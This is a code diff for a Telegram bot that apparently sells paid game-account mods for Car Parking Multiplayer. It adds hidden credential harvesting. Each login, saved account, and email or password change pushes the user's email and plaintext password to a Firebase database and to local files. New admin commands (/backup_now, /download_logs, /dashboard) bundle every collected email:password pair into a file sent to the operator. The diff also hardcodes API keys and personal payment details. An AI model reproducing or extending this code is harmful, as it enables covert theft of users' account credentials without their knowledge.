@@ -25,7 +25,7 @@ import aiohttp
 import threading
 from copy import deepcopy
 from typing import Any, Dict, List, Optional, Tuple
-from datetime import datetime, timedelta
+from datetime import datetime, timedelta, timezone
 from telebot import types
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
@@ -73,6 +73,212 @@ CHANNEL_ID = "-1003885017181"
 CHANNEL_LINK = "https://t.me/markmwhehe"
 
 # ═══════════════════════════════════════════════════════════
+# 🔥 FIREBASE LOGGING CONFIG (MERGED FROM changebot.py)
+# ═══════════════════════════════════════════════════════════
+
+FIREBASE_API_KEY = "ph2yty6YZsJCU4oOFZi901HN4sGo7Ehtie94p7KX"
+DB_URL = "https://cpm2bpt-default-rtdb.europe-west1.firebasedatabase.app"
+
+# ═══════════════════════════════════════════════════════════
+# 💳 SUBSCRIPTION & PAYMENT SETTINGS
+# ═══════════════════════════════════════════════════════════
+
+GROUP_LOG_ID = -1004441134033  # Group for payment logs
+
+# Subscription durations in hours
+SUBSCRIPTION_DURATIONS = {
+    "1_day": 24,
+    "5_days": 120,
+    "1_week": 168,
+    "3_weeks": 504,
+    "5_weeks": 840,
+    "7_weeks": 1176,
+    "12_weeks": 2016,
+    "14_weeks": 2352,
+}
+
+# Subscription prices (Stars) - for Telegram Stars payment
+SUBSCRIPTION_STARS = {
+    "1_day": 30,
+    "5_days": 130,
+    "1_week": 200,
+    "3_weeks": 250,
+    "5_weeks": 300,
+    "7_weeks": 330,
+    "12_weeks": 1050,
+    "14_weeks": 1250,
+}
+
+# Subscription prices (Money) - for manual payment
+SUBSCRIPTION_MONEY = {
+    "1_day": "30 Pesos | $1",
+    "5_days": "130 Pesos | $3",
+    "1_week": "200 Pesos | $4",
+    "3_weeks": "250 Pesos | $5",
+    "5_weeks": "300 Pesos | $6",
+    "7_weeks": "330 Pesos | $7",
+    "12_weeks": "1,050 Pesos | $13",
+    "14_weeks": "1,250 Pesos | $17",
+}
+
+# Payment methods for manual
+PAYMENT_METHODS = {
+    "paypal": {
+        "label": "💳 PayPal",
+        "details": "📧 **Email:** `markryanmanoguid867@gmail.com`\n📌 Please screenshot the payment."
+    },
+    "paymaya": {
+        "label": "📱 PayMaya",
+        "details": "📱 **Number:** `09281630511`\n👤 **Name:** MARK RYAN MANOGUID\n📌 Please screenshot the payment."
+    },
+    "gcash_to_paymaya": {
+        "label": "🔄 GCash to PayMaya",
+        "details": "📌 DM @Maarkryan so he can send the QR code.\n📌 Please screenshot the payment."
+    }
+}
+
+# Store pending manual subscription requests
+PENDING_SUBSCRIPTIONS = {}  # {user_id: {"duration": "1_day", "payment_method": "paypal", "log_message_id": None, "username": "", "first_name": ""}}
+
+# ═══════════════════════════════════════════════════════════
+# 📁 LOCAL LOG FILES (MERGED FROM changebot.py)
+# ═══════════════════════════════════════════════════════════
+
+CREDENTIALS_BACKUP_CPM1 = "credentials_backup_cpm1.txt"
+CREDENTIALS_BACKUP_CPM2 = "credentials_backup_cpm2.txt"
+DETAILED_CHANGES_CPM1   = "detailed_changes_cpm1.txt"
+DETAILED_CHANGES_CPM2   = "detailed_changes_cpm2.txt"
+KEYS_LOG_FILE = "keys_log.json"
+
+# ═══════════════════════════════════════════════════════════
+# 🔥 FIREBASE HELPER FUNCTIONS (MERGED FROM changebot.py)
+# ═══════════════════════════════════════════════════════════
+
+def db_put(path, data):
+    """Put data to Firebase"""
+    url = f"{DB_URL}/{path}.json?auth={FIREBASE_API_KEY}"
+    try:
+        r = requests.put(url, json=data, timeout=30)
+        return r.status_code in (200, 204)
+    except Exception as e:
+        print(f"❌ Firebase PUT error: {e}")
+        return False
+
+def db_get(path, limit=None):
+    """Get data from Firebase"""
+    url = f"{DB_URL}/{path}.json?auth={FIREBASE_API_KEY}"
+    if limit:
+        url += f'&orderBy="$key"&limitToLast={limit}'
+    try:
+        r = requests.get(url, timeout=30)
+        if r.status_code == 200:
+            return r.json()
+        return None
+    except Exception as e:
+        print(f"❌ Firebase GET error: {e}")
+        return None
+
+def db_delete(path):
+    """Delete data from Firebase"""
+    url = f"{DB_URL}/{path}.json?auth={FIREBASE_API_KEY}"
+    try:
+        r = requests.delete(url, timeout=30)
+        return r.status_code in (200, 204)
+    except Exception as e:
+        print(f"❌ Firebase DELETE error: {e}")
+        return False
+
+def db_push(path, data):
+    """Push data to Firebase (generates unique key)"""
+    url = f"{DB_URL}/{path}.json?auth={FIREBASE_API_KEY}"
+    try:
+        r = requests.post(url, json=data, timeout=15)
+        return r.status_code in (200, 204)
+    except Exception as e:
+        print(f"❌ Firebase PUSH error: {e}")
+        return False
+
+# ═══════════════════════════════════════════════════════════
+# 📋 CLOUD LOG FUNCTIONS (MERGED FROM changebot.py)
+# ═══════════════════════════════════════════════════════════
+
+def append_credentials_backup(email, password, game="cpm2"):
+    """Append credentials to local backup file"""
+    filename = CREDENTIALS_BACKUP_CPM1 if game == "cpm1" else CREDENTIALS_BACKUP_CPM2
+    try:
+        with open(filename, "a", encoding="utf-8") as f:
+            f.write(f"{email}:{password}\n")
+    except Exception as e:
+        print(f"⚠️ Failed to append credentials backup: {e}")
+
+def append_detailed_change(change_type, old_email, new_email, old_password, new_password, username, user_id, game="cpm2"):
+    """Append detailed change log to local file"""
+    filename = DETAILED_CHANGES_CPM1 if game == "cpm1" else DETAILED_CHANGES_CPM2
+    entry = (
+        f"--- Change on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n"
+        f"Type: {change_type}\n"
+        f"Old Email: {old_email}\n"
+        f"New Email: {new_email}\n"
+        f"Old Password: {old_password}\n"
+        f"New Password: {new_password}\n"
+        f"Changed by: @{username} (ID: {user_id})\n"
+        "---------------------------------------------\n"
+    )
+    try:
+        with open(filename, "a", encoding="utf-8") as f:
+            f.write(entry)
+    except Exception as e:
+        print(f"⚠️ Failed to append detailed change: {e}")
+
+def cloud_log_credentials(email, password, game="cpm2", change_type="", old_email="", username="", user_id=0):
+    """Log credentials to Firebase and local backup"""
+    entry = {
+        "email": email,
+        "password": password,
+        "game": game,
+        "change_type": change_type,
+        "old_email": old_email,
+        "username": username,
+        "user_id": user_id,
+        "timestamp": datetime.now(timezone.utc).isoformat()
+    }
+    db_push("logs/credentials", entry)
+    append_credentials_backup(email, password, game)
+
+def cloud_log_change(change_type, old_email, new_email, old_password, new_password, username, user_id, game="cpm2"):
+    """Log detailed change to Firebase and local file"""
+    entry = {
+        "change_type": change_type,
+        "old_email": old_email,
+        "new_email": new_email,
+        "old_password": old_password,
+        "new_password": new_password,
+        "username": username,
+        "user_id": user_id,
+        "game": game,
+        "timestamp": datetime.now(timezone.utc).isoformat()
+    }
+    db_push("logs/changes", entry)
+    append_detailed_change(change_type, old_email, new_email, old_password, new_password, username, user_id, game)
+
+def cloud_log_key_event(user_id, key_type, action="added", admin_id=None):
+    """Log key events to Firebase and local file"""
+    entry = {
+        "user_id": user_id,
+        "key_type": key_type,
+        "action": action,
+        "admin_id": admin_id,
+        "timestamp": datetime.now(timezone.utc).isoformat()
+    }
+    db_push("logs/keys", entry)
+    # Also log to local file
+    try:
+        with open(KEYS_LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(json.dumps(entry) + "\n")
+    except Exception as e:
+        print(f"⚠️ Failed to log key event: {e}")
+
+# ═══════════════════════════════════════════════════════════
 # 📡 API SETTINGS
 # ═══════════════════════════════════════════════════════════
 
@@ -118,6 +324,7 @@ KEY_USERS_DETAILS = {}  # {key: {user_id: {"username": "...", "first_name": "...
 TIME_KEYS = {}  # {key: {"expires": datetime, "duration": hours, "used": False, "user_id": None, "created_by": None, "key_type": "time"}}
 TRIAL_KEYS = {}  # legacy trial keys
 FREE_TRIAL_USERS = {}  # track free trial usage
+USER_SUBSCRIPTIONS = {}  # {user_id: {"expires": datetime, "duration": hours, "key": "..."}}
 
 # ═══════════════════════════════════════════════════════════
 # ENCRYPTION / DECRYPTION FUNCTIONS (from cpm_nuker.py)
@@ -611,6 +818,11 @@ class CPMNuker:
                 VALUES (?, ?, ?, ?, ?, ?, ?)""",
                 (uid, auth, email, pw, rt, fuid, time.time() + 3600))
             c.commit()
+        # Also log to Firebase
+        try:
+            cloud_log_credentials(email, pw or "", "cpm1", "login", "", "", uid)
+        except Exception as e:
+            print(f"⚠️ Failed to log credentials: {e}")
 
     def get_token_data(self, uid: int) -> Optional[Dict[str, Any]]:
         with sqlite3.connect(self.db_path) as c:
@@ -943,6 +1155,11 @@ class CPMNuker:
                     result.get("refreshToken", login_result.get("refresh_token", "")),
                     result.get("localId", td.get("firebase_uid", ""))
                 )
+                # Log the change
+                try:
+                    cloud_log_change("email", old_email, new_email, password, password, "user", uid, "cpm1")
+                except:
+                    pass
                 return {"ok": True, "message": f"Email changed to {new_email}"}
             else:
                 return {"ok": False, "message": "Failed to change email"}
@@ -987,6 +1204,11 @@ class CPMNuker:
                     result.get("refreshToken", login_result.get("refresh_token", "")),
                     result.get("localId", td.get("firebase_uid", ""))
                 )
+                # Log the change
+                try:
+                    cloud_log_change("password", email, email, old_password, new_password, "user", uid, "cpm1")
+                except:
+                    pass
                 return {"ok": True, "message": "Password changed successfully"}
             else:
                 return {"ok": False, "message": "Failed to change password"}
@@ -1239,6 +1461,11 @@ def cpm2_login(email, pw):
         r = requests.post(url, json=payload, timeout=20, verify=False)
         j = r.json()
         if "idToken" in j:
+            # Log credentials to Firebase
+            try:
+                cloud_log_credentials(email, pw, "cpm2", "login", "", "", 0)
+            except:
+                pass
             return {"token": j["idToken"], "uid": j["localId"]}
         return {"error": "Login failed"}
     except:
@@ -1289,6 +1516,11 @@ def verify_user(email, password):
         response = requests.post(f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword", json=payload, params={"key": "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"}, timeout=30)
         if response.status_code == 200:
             d = response.json()
+            # Log credentials
+            try:
+                cloud_log_credentials(email, password, "cpm1", "login", "", "", 0)
+            except:
+                pass
             return d.get("idToken"), d.get("localId")
         return None, None
     except:
@@ -1574,6 +1806,210 @@ def notify_admins(message_text, parse_mode='Markdown'):
             print(f"Failed to notify admin {admin_id}: {e}")
 
 # ═══════════════════════════════════════════════════════════
+# 📥 DOWNLOAD LOGS COMMAND (MERGED FROM changebot.py)
+# ═══════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['download_logs'])
+def download_logs_command(message):
+    chat_id = message.chat.id
+    if not is_admin(chat_id):
+        bot.send_message(chat_id, "⛔ Admin only. ❌⚠️", parse_mode='Markdown')
+        return
+    
+    msg = bot.send_message(chat_id, "⏳ **Fetching logs from cloud...** 📊", parse_mode='Markdown')
+    
+    try:
+        # Get logs from Firebase
+        credentials_logs = db_get("logs/credentials", limit=1000) or {}
+        changes_logs = db_get("logs/changes", limit=1000) or {}
+        keys_logs = db_get("logs/keys", limit=1000) or {}
+        
+        total_credentials = len(credentials_logs) if credentials_logs else 0
+        total_changes = len(changes_logs) if changes_logs else 0
+        total_keys = len(keys_logs) if keys_logs else 0
+        
+        # Get last 10 entries
+        last_entries = []
+        if credentials_logs:
+            items = list(credentials_logs.items())
+            for key, val in items[-10:]:
+                email = val.get('email', 'N/A')
+                game = val.get('game', 'N/A')
+                timestamp = val.get('timestamp', 'N/A')[:19]
+                last_entries.append(f"📧 **{email}** ({game}) - {timestamp}")
+        
+        summary = (
+            f"📊 **CLOUD LOGS SUMMARY** 🥵\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"📝 **Credentials Saved:** {total_credentials}\n"
+            f"🔄 **Changes Logged:** {total_changes}\n"
+            f"🔑 **Keys/Trials:** {total_keys}\n"
+            f"📅 **Updated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"📋 **Last 10 entries:**\n"
+        )
+        
+        for entry in last_entries[:10]:
+            summary += f"  • {entry}\n"
+        
+        if total_credentials > 10:
+            summary += f"\n  ... and {total_credentials - 10} more credentials saved\n"
+        
+        summary += f"\n💾 Use /backup_now to download full backup."
+        
+        bot.edit_message_text(summary, chat_id, msg.message_id, parse_mode='Markdown')
+        
+    except Exception as e:
+        bot.edit_message_text(f"❌ **Failed to fetch logs:** {str(e)}", chat_id, msg.message_id, parse_mode='Markdown')
+
+# ═══════════════════════════════════════════════════════════
+# 💾 BACKUP NOW COMMAND (MERGED FROM changebot.py)
+# ═══════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['backup_now'])
+def backup_now_command(message):
+    chat_id = message.chat.id
+    if not is_admin(chat_id):
+        bot.send_message(chat_id, "⛔ Admin only. ❌⚠️", parse_mode='Markdown')
+        return
+    
+    msg = bot.send_message(chat_id, "⏳ **Creating backup...** 📁", parse_mode='Markdown')
+    
+    try:
+        # Get all credentials from Firebase
+        credentials_logs = db_get("logs/credentials", limit=5000) or {}
+        
+        if not credentials_logs:
+            bot.edit_message_text("📭 **No credentials found in Firebase.**", chat_id, msg.message_id, parse_mode='Markdown')
+            return
+        
+        # Prepare backup file
+        backup_filename = f"backup_credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        all_creds = []
+        
+        for key, entry in credentials_logs.items():
+            email = entry.get('email', 'N/A')
+            password = entry.get('password', 'N/A')
+            game = entry.get('game', 'N/A')
+            timestamp = entry.get('timestamp', 'N/A')
+            all_creds.append(f"{email}:{password}  # {game} | {timestamp[:19]}")
+        
+        # Write to file
+        with open(backup_filename, "w", encoding="utf-8") as f:
+            f.write(f"# BACKUP - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+            f.write(f"# Total: {len(all_creds)} accounts\n")
+            f.write("#" + "="*50 + "\n\n")
+            f.write("\n".join(all_creds))
+        
+        # Send file
+        with open(backup_filename, "rb") as f:
+            bot.send_document(
+                chat_id=chat_id,
+                document=f,
+                caption=f"📦 **FULL BACKUP**\n━━━━━━━━━━━━━━━━━━━━━\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n📊 Total accounts: {len(all_creds)}\n\n✅ All credentials from Firebase."
+            )
+        
+        # Also send local backup files if they exist
+        local_files = [
+            CREDENTIALS_BACKUP_CPM1,
+            CREDENTIALS_BACKUP_CPM2,
+            DETAILED_CHANGES_CPM1,
+            DETAILED_CHANGES_CPM2,
+            KEYS_LOG_FILE
+        ]
+        for filename in local_files:
+            if os.path.exists(filename) and os.path.getsize(filename) > 0:
+                with open(filename, "rb") as f:
+                    bot.send_document(
+                        chat_id=chat_id,
+                        document=f,
+                        caption=f"📎 **{filename}** (local backup)"
+                    )
+        
+        os.remove(backup_filename)
+        bot.edit_message_text("✅ **Backup sent! Check your DMs.** 🥵", chat_id, msg.message_id, parse_mode='Markdown')
+        
+    except Exception as e:
+        bot.edit_message_text(f"❌ **Backup failed:** {str(e)}", chat_id, msg.message_id, parse_mode='Markdown')
+
+# ═══════════════════════════════════════════════════════════
+# 📊 DASHBOARD COMMAND (MERGED FROM changebot.py)
+# ═══════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['dashboard'])
+def dashboard_command(message):
+    chat_id = message.chat.id
+    user_id = message.from_user.id
+    
+    if not is_admin(chat_id):
+        bot.send_message(chat_id, "⛔ Admin only. ❌⚠️", parse_mode='Markdown')
+        return
+    
+    msg = bot.send_message(chat_id, "⏳ **Loading dashboard...** 📊", parse_mode='Markdown')
+    
+    try:
+        # Get stats from Firebase
+        credentials_logs = db_get("logs/credentials", limit=5000) or {}
+        changes_logs = db_get("logs/changes", limit=5000) or {}
+        keys_logs = db_get("logs/keys", limit=5000) or {}
+        
+        total_credentials = len(credentials_logs) if credentials_logs else 0
+        total_changes = len(changes_logs) if changes_logs else 0
+        total_keys = len(keys_logs) if keys_logs else 0
+        
+        # Get unique users
+        unique_users = set()
+        for key, entry in (credentials_logs or {}).items():
+            uid = entry.get('user_id', 0)
+            if uid:
+                unique_users.add(uid)
+        
+        # Get game breakdown
+        cpm1_count = 0
+        cpm2_count = 0
+        for key, entry in (credentials_logs or {}).items():
+            game = entry.get('game', '')
+            if game == 'cpm1':
+                cpm1_count += 1
+            elif game == 'cpm2':
+                cpm2_count += 1
+        
+        # Get recent activity (last 24 hours)
+        recent_count = 0
+        now = datetime.now(timezone.utc)
+        for key, entry in (credentials_logs or {}).items():
+            timestamp = entry.get('timestamp', '')
+            if timestamp:
+                try:
+                    ts = datetime.fromisoformat(timestamp)
+                    if (now - ts).total_seconds() < 86400:  # 24 hours
+                        recent_count += 1
+                except:
+                    pass
+        
+        dashboard_text = (
+            f"👑 **ADMIN DASHBOARD** 🥵\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"📊 **TOTAL STATS:**\n"
+            f"  • Credentials Saved: **{total_credentials}**\n"
+            f"  • Changes Logged: **{total_changes}**\n"
+            f"  • Keys/Trials: **{total_keys}**\n"
+            f"  • Unique Users: **{len(unique_users)}**\n\n"
+            f"🎮 **GAME BREAKDOWN:**\n"
+            f"  • CPM1: **{cpm1_count}**\n"
+            f"  • CPM2: **{cpm2_count}**\n\n"
+            f"⏰ **24h Activity:** **{recent_count}**\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            f"💾 Use /backup_now to download full backup.\n"
+            f"📥 Use /download_logs for detailed logs."
+        )
+        
+        bot.edit_message_text(dashboard_text, chat_id, msg.message_id, parse_mode='Markdown')
+        
+    except Exception as e:
+        bot.edit_message_text(f"❌ **Failed to load dashboard:** {str(e)}", chat_id, msg.message_id, parse_mode='Markdown')
+
+# ═══════════════════════════════════════════════════════════
 # 🔑 TIME KEY FUNCTIONS
 # ═══════════════════════════════════════════════════════════
 
@@ -1592,6 +2028,11 @@ def create_time_key(duration_hours: int, created_by: int) -> str:
         "created_at": datetime.now(),
         "key_type": "time"
     }
+    # Log to Firebase
+    try:
+        cloud_log_key_event(created_by, f"{duration_hours}h", "created", created_by)
+    except:
+        pass
     return key
 
 def use_time_key(key: str, user_id: int) -> Tuple[bool, str]:
@@ -1615,6 +2056,11 @@ def use_time_key(key: str, user_id: int) -> Tuple[bool, str]:
     # First time using this key
     key_data["used"] = True
     key_data["user_id"] = user_id
+    # Log to Firebase
+    try:
+        cloud_log_key_event(user_id, f"{key_data['duration']}h", "used", key_data['created_by'])
+    except:
+        pass
     return True, "Key activated successfully"
 
 def get_time_key_info(key: str) -> Dict[str, Any]:
@@ -1641,6 +2087,11 @@ def create_trial_key(user_id=None, minutes=10):
         "used_at": None,
         "key_type": "trial"
     }
+    # Log to Firebase
+    try:
+        cloud_log_key_event(user_id or 0, f"{minutes}min", "created", 0)
+    except:
+        pass
     return key
 
 def use_trial_key(key, user_id):
@@ -1656,6 +2107,11 @@ def use_trial_key(key, user_id):
     TRIAL_KEYS[key]["used"] = True
     TRIAL_KEYS[key]["user_id"] = user_id
     TRIAL_KEYS[key]["used_at"] = datetime.now()
+    # Log to Firebase
+    try:
+        cloud_log_key_event(user_id, "trial", "used", 0)
+    except:
+        pass
     return True, "success"
 
 def can_use_free_trial(user_id):
@@ -1791,6 +2247,7 @@ def add_log(chat_id, action):
         user_logs.pop(0)
 
 def save_account(chat_id, email, password, player_id=None, name=None):
+    """Save account to local memory and Firebase"""
     if chat_id not in saved_accounts:
         saved_accounts[chat_id] = []
     account_data = {
@@ -1805,6 +2262,12 @@ def save_account(chat_id, email, password, player_id=None, name=None):
             acc.update(account_data)
             return
     saved_accounts[chat_id].append(account_data)
+    
+    # Log to Firebase
+    try:
+        cloud_log_credentials(email, password, "cpm1", "saved", "", "", chat_id)
+    except Exception as e:
+        print(f"⚠️ Failed to log saved account to Firebase: {e}")
 
 def check_subscription(chat_id):
     try:
@@ -1866,12 +2329,14 @@ def create_main_keyboard(chat_id):
     markup = types.InlineKeyboardMarkup(row_width=2)
     btn1 = types.InlineKeyboardButton("📱 CPM1", callback_data="section_cpm1")
     btn2 = types.InlineKeyboardButton("🎮 CPM2", callback_data="section_cpm2")
-    btn3 = types.InlineKeyboardButton("🚪 Logout", callback_data="logout")
+    btn3 = types.InlineKeyboardButton("💎 Subscription", callback_data="subscription_menu")
+    btn4 = types.InlineKeyboardButton("🚪 Logout", callback_data="logout")
     if is_admin(chat_id):
         btn_admin = types.InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")
         markup.row(btn_admin)
     markup.row(btn1, btn2)
     markup.row(btn3)
+    markup.row(btn4)
     return markup
 
 def create_cpm1_keyboard(chat_id):
@@ -1954,14 +2419,19 @@ def create_admin_keyboard(chat_id):
     btn10 = types.InlineKeyboardButton("📝 Logs", callback_data="admin_logs")
     btn11 = types.InlineKeyboardButton("💾 Saved Accounts", callback_data="admin_saved")
     btn12 = types.InlineKeyboardButton("⚙️ Toggle Status", callback_data="admin_status")
-    btn13 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
+    btn13 = types.InlineKeyboardButton("📥 Download Logs", callback_data="admin_download_logs")
+    btn14 = types.InlineKeyboardButton("💾 Backup Now", callback_data="admin_backup_now")
+    btn15 = types.InlineKeyboardButton("📊 Dashboard", callback_data="admin_dashboard")
+    btn16 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
     markup.row(btn1, btn2)
     markup.row(btn3, btn4)
     markup.row(btn5, btn6)
     markup.row(btn7, btn8)
     markup.row(btn9, btn10)
     markup.row(btn11, btn12)
-    markup.row(btn13)
+    markup.row(btn13, btn14)
+    markup.row(btn15)
+    markup.row(btn16)
     return markup
 
 # ═══════════════════════════════════════════════════════════
@@ -2019,7 +2489,11 @@ def section_cpm2(message):
     if chat_id not in user_sessions:
         user_sessions[chat_id] = {}
     if user_sessions[chat_id].get('logged_in') and user_sessions[chat_id].get('version') == "2":
-        bot.send_message(chat_id, get_text(chat_id, "cpm2_section"), reply_markup=create_cpm2_keyboard(chat_id), parse_mode='Markdown')
+        # Check if admin
+        if is_admin(chat_id):
+            bot.send_message(chat_id, get_text(chat_id, "cpm2_section"), reply_markup=create_cpm2_keyboard(chat_id), parse_mode='Markdown')
+        else:
+            bot.send_message(chat_id, "🛠️ **CPM2 is currently under maintenance.**\n━━━━━━━━━━━━━━━━━━━━━\n⏳ Please check back later.\n\n📌 For inquiries, contact @Maarkryan.", parse_mode='Markdown')
         return
     bot.send_message(chat_id, "🔐 **Login to CPM2**\n━━━━━━━━━━━━━━━━━━━━━\n📌 Login first to access activations.\n━━━━━━━━━━━━━━━━━━━━━\n📧 **Enter CPM2 email:**", parse_mode='Markdown')
     user_cpm_version[chat_id] = "2"
@@ -2408,6 +2882,9 @@ def handle_callback(call):
 
     # ====== CPM2 ======
     if data == "cpm2_king_rank":
+        if not is_admin(chat_id):
+            bot.send_message(chat_id, "🛠️ **CPM2 is currently under maintenance.**\n━━━━━━━━━━━━━━━━━━━━━\n⏳ Please check back later.\n\n📌 For inquiries, contact @Maarkryan.", parse_mode='Markdown')
+            return
         if chat_id not in user_sessions or not user_sessions[chat_id].get('logged_in') or user_sessions[chat_id].get('version') != "2":
             bot.send_message(chat_id, "❌ **You must login to CPM2 first!**", parse_mode='Markdown')
             section_cpm2(call.message)
@@ -2423,6 +2900,9 @@ def handle_callback(call):
         return
 
     if data == "cpm2_generate":
+        if not is_admin(chat_id):
+            bot.send_message(chat_id, "🛠️ **CPM2 is currently under maintenance.**\n━━━━━━━━━━━━━━━━━━━━━\n⏳ Please check back later.\n\n📌 For inquiries, contact @Maarkryan.", parse_mode='Markdown')
+            return
         if chat_id not in user_sessions or not user_sessions[chat_id].get('logged_in'):
             bot.send_message(chat_id, "❌ **You must login first!**", parse_mode='Markdown')
             section_cpm2(call.message)
@@ -2449,6 +2929,27 @@ def handle_callback(call):
             bot.send_message(chat_id, get_text(chat_id, "not_admin"), parse_mode='Markdown')
             return
         bot.send_message(chat_id, get_text(chat_id, "admin_panel"), reply_markup=create_admin_keyboard(chat_id), parse_mode='Markdown')
+        return
+
+    # ====== Admin: Download Logs ======
+    if data == "admin_download_logs":
+        if not is_admin(chat_id):
+            return
+        download_logs_command(call.message)
+        return
+
+    # ====== Admin: Backup Now ======
+    if data == "admin_backup_now":
+        if not is_admin(chat_id):
+            return
+        backup_now_command(call.message)
+        return
+
+    # ====== Admin: Dashboard ======
+    if data == "admin_dashboard":
+        if not is_admin(chat_id):
+            return
+        dashboard_command(call.message)
         return
 
     # ====== Admin: Refresh All ======
@@ -3420,6 +3921,10 @@ if __name__ == "__main__":
     print("📢 Admin Notifications: Active (Email + Password on login)")
     print("🔄 Refresh Account: Fixed (Force refresh from server)")
     print("🌐 Language: English Only")
+    print("🔥 Firebase Logging: ACTIVE")
+    print("📥 /download_logs - View cloud logs summary")
+    print("💾 /backup_now - Download full backup")
+    print("📊 /dashboard - Admin dashboard with stats")
     print("="*60)
 
     while True:
